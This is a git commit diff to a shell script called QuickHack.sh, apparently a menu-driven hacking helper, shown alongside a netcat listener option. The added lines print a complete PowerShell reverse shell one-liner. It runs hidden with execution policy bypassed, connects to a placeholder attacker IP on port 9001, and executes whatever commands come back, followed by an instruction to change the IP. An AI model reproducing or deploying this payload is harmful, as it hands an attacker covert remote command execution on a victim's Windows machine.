b8dbde2eb2a7be71fb0ad8d86549d223af607caa
chill-c0der <99861040+chill-c0der2@users.noreply.github.com>
2022-12-08 09:50:29 -0800

    Update QuickHack.sh

--- QuickHack.sh
+++ QuickHack.sh
@@ -10,7 +10,9 @@ do
             nc –lvnp 8080
             ;;
         "Reverse Shell Generator")
-            bash shelly.sh -h $7 -p 8080 -l powershell
+            cls
+            echo powershell -nop -W hidden -noni -ep bypass -c "$TCPClient = New-Object Net.Sockets.TCPClient('yourip', 9001);$NetworkStream = $TCPClient.GetStream();$StreamWriter = New-Object IO.StreamWriter($NetworkStream);function WriteToStream ($String) {[byte[]]$script:Buffer = 0..$TCPClient.ReceiveBufferSize | % {0};$StreamWriter.Write($String + 'SHELL> ');$StreamWriter.Flush()}WriteToStream '';while(($BytesRead = $NetworkStream.Read($Buffer, 0, $Buffer.Length)) -gt 0) {$Command = ([text.encoding]::UTF8).GetString($Buffer, 0, $BytesRead - 1);$Output = try {Invoke-Expression $Command 2>&1 | Out-String} catch {$_ | Out-String}WriteToStream ($Output)}$StreamWriter.Close()"
+            echo change the ip adress in the payload
             ;;
         "Quit")
             break
